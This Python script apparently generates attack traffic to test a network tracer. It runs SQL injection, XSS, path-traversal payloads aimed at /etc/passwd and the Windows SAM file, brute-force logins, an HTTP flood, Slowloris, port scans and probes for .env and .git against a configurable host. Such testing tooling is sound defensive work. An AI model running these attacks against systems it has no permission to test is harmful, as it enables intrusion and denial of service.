#!/usr/bin/env python3
"""
Attack Simulator for NFT Tracer Testing
Simulates various attack patterns for security testing
"""

import socket
import requests
import time
import random
import sys
import logging
from concurrent.futures import ThreadPoolExecutor
from threading import Thread

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class AttackSimulator:
    """Simulates various attack patterns"""

    def __init__(self, target_host='localhost', target_port=8080):
        self.target_host = target_host
        self.target_port = target_port
        self.base_url = f"http://{target_host}:{target_port}"

    def simulate_sql_injection_attempts(self, num_attempts=20):
        """Simulate SQL injection attack attempts"""
        logging.warning("⚠️  Simulating SQL injection attempts (for testing only!)")

        sql_payloads = [
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' ORDER BY 1--",
            "' OR 1=1--",
            "admin' OR '1'='1'#",
            "' DROP TABLE users--"
        ]

        for i in range(num_attempts):
            payload = random.choice(sql_payloads)
            try:
                response = requests.get(
                    f"{self.base_url}/api/search",
                    params={'q': payload},
                    timeout=5
                )
                logging.info(f"SQL Injection attempt {i+1}: Payload='{payload}' Status={response.status_code}")
            except Exception as e:
                logging.error(f"Request failed: {e}")

            time.sleep(random.uniform(0.5, 2))

        logging.info("SQL injection simulation completed")

    def simulate_xss_attempts(self, num_attempts=15):
        """Simulate XSS attack attempts"""
        logging.warning("⚠️  Simulating XSS attempts (for testing only!)")

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]

        for i in range(num_attempts):
            payload = random.choice(xss_payloads)
            try:
                response = requests.post(
                    f"{self.base_url}/api/upload",
                    json={'data': payload},
                    timeout=5
                )
                logging.info(f"XSS attempt {i+1}: Status={response.status_code}")
            except Exception as e:
                logging.error(f"Request failed: {e}")

            time.sleep(random.uniform(0.3, 1.5))

        logging.info("XSS simulation completed")

    def simulate_brute_force_login(self, num_attempts=30):
        """Simulate brute force login attempts"""
        logging.warning("⚠️  Simulating brute force login (for testing only!)")

        usernames = ['admin', 'root', 'user', 'test']
        passwords = ['password', '123456', 'admin', 'qwerty', 'letmein']

        for i in range(num_attempts):
            username = random.choice(usernames)
            password = random.choice(passwords)

            try:
                response = requests.post(
                    f"{self.base_url}/api/login",
                    json={'username': username, 'password': password},
                    timeout=5
                )
                logging.info(f"Login attempt {i+1}: user={username} Status={response.status_code}")
            except Exception as e:
                logging.debug(f"Request failed: {e}")

            time.sleep(random.uniform(0.2, 1))

        logging.info("Brute force simulation completed")

    def simulate_ddos_attack(self, duration=30, threads=50):
        """Simulate DDoS attack pattern"""
        logging.warning(f"⚠️  Simulating DDoS attack for {duration} seconds (for testing only!)")

        def attack_worker():
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    requests.get(f"{self.base_url}/", timeout=2)
                except:
                    pass
                time.sleep(0.01)

        threads_list = []
        for i in range(threads):
            thread = Thread(target=attack_worker)
            thread.start()
            threads_list.append(thread)

        for thread in threads_list:
            thread.join()

        logging.info("DDoS simulation completed")

    def simulate_slowloris_attack(self, num_connections=20, duration=60):
        """Simulate Slowloris attack (slow HTTP)"""
        logging.warning(f"⚠️  Simulating Slowloris attack (for testing only!)")

        sockets = []

        try:
            # Open connections
            for i in range(num_connections):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((self.target_host, self.target_port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\n")
                    sockets.append(sock)
                    logging.info(f"Opened slow connection {i+1}")
                except Exception as e:
                    logging.error(f"Failed to open connection: {e}")

            # Keep connections alive
            start_time = time.time()
            while time.time() - start_time < duration:
                for sock in sockets[:]:
                    try:
                        sock.send(b"X-a: b\r\n")
                    except:
                        sockets.remove(sock)

                time.sleep(10)
                logging.info(f"Keeping {len(sockets)} connections alive...")

        finally:
            # Close all sockets
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass

        logging.info("Slowloris simulation completed")

    def simulate_path_traversal(self, num_attempts=15):
        """Simulate path traversal attack"""
        logging.warning("⚠️  Simulating path traversal attempts (for testing only!)")

        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd"
        ]

        for i in range(num_attempts):
            payload = random.choice(payloads)
            try:
                response = requests.get(
                    f"{self.base_url}/files",
                    params={'file': payload},
                    timeout=5
                )
                logging.info(f"Path traversal attempt {i+1}: Status={response.status_code}")
            except Exception as e:
                logging.error(f"Request failed: {e}")

            time.sleep(random.uniform(0.5, 2))

        logging.info("Path traversal simulation completed")

    def simulate_port_scanning(self, start_port=8000, end_port=8100):
        """Simulate aggressive port scanning"""
        logging.warning(f"⚠️  Simulating port scan on {self.target_host}:{start_port}-{end_port}")

        open_ports = []

        for port in range(start_port, end_port + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)  # Very fast scan
                result = sock.connect_ex((self.target_host, port))

                if result == 0:
                    open_ports.append(port)
                    logging.info(f"Port {port}: OPEN")

                sock.close()

            except Exception as e:
                pass

        logging.info(f"Port scan completed. Found {len(open_ports)} open ports")

    def simulate_reconnaissance(self):
        """Simulate reconnaissance phase of an attack"""
        logging.warning("⚠️  Simulating reconnaissance activity")

        # Check common endpoints
        endpoints = [
            '/admin', '/login', '/api', '/config', '/backup',
            '/phpmyadmin', '/.git', '/.env', '/robots.txt',
            '/sitemap.xml', '/wp-admin'
        ]

        for endpoint in endpoints:
            try:
                response = requests.get(f"{self.base_url}{endpoint}", timeout=5)
                logging.info(f"Recon: {endpoint} - Status {response.status_code}")
            except:
                pass
            time.sleep(random.uniform(0.2, 0.8))

        logging.info("Reconnaissance simulation completed")

def main():
    """Main function"""
    print("🚨 Attack Simulator")
    print("=" * 50)
    print("⚠️  WARNING: This tool simulates attacks for TESTING ONLY!")
    print("Only use on systems you own or have permission to test!")
    print("=" * 50)
    print()

    if len(sys.argv) < 2:
        print("Usage: python attack-simulator.py <attack_type> [target_host] [target_port]")
        print("\nAttack Types:")
        print("  sql        - SQL injection attempts")
        print("  xss        - XSS attempts")
        print("  brute      - Brute force login")
        print("  ddos       - DDoS simulation")
        print("  slowloris  - Slowloris attack")
        print("  traversal  - Path traversal")
        print("  portscan   - Port scanning")
        print("  recon      - Reconnaissance")
        print("  all        - Run all simulations")
        sys.exit(1)

    attack_type = sys.argv[1]
    target_host = sys.argv[2] if len(sys.argv) > 2 else 'localhost'
    target_port = int(sys.argv[3]) if len(sys.argv) > 3 else 8080

    simulator = AttackSimulator(target_host, target_port)

    time.sleep(2)  # Give user time to read warning

    try:
        if attack_type == 'sql':
            simulator.simulate_sql_injection_attempts()
        elif attack_type == 'xss':
            simulator.simulate_xss_attempts()
        elif attack_type == 'brute':
            simulator.simulate_brute_force_login()
        elif attack_type == 'ddos':
            simulator.simulate_ddos_attack(duration=10, threads=20)
        elif attack_type == 'slowloris':
            simulator.simulate_slowloris_attack(num_connections=10, duration=30)
        elif attack_type == 'traversal':
            simulator.simulate_path_traversal()
        elif attack_type == 'portscan':
            simulator.simulate_port_scanning()
        elif attack_type == 'recon':
            simulator.simulate_reconnaissance()
        elif attack_type == 'all':
            print("\n1. Reconnaissance...")
            simulator.simulate_reconnaissance()
            print("\n2. SQL Injection...")
            simulator.simulate_sql_injection_attempts(10)
            print("\n3. XSS Attempts...")
            simulator.simulate_xss_attempts(10)
            print("\n4. Port Scanning...")
            simulator.simulate_port_scanning(8000, 8020)
        else:
            print(f"Unknown attack type: {attack_type}")
            sys.exit(1)

        print("\n✅ Attack simulation completed!")
        print("Check NFT Tracer logs for captured traffic")

    except KeyboardInterrupt:
        print("\n\nAttack simulation stopped by user")

if __name__ == '__main__':
    main()
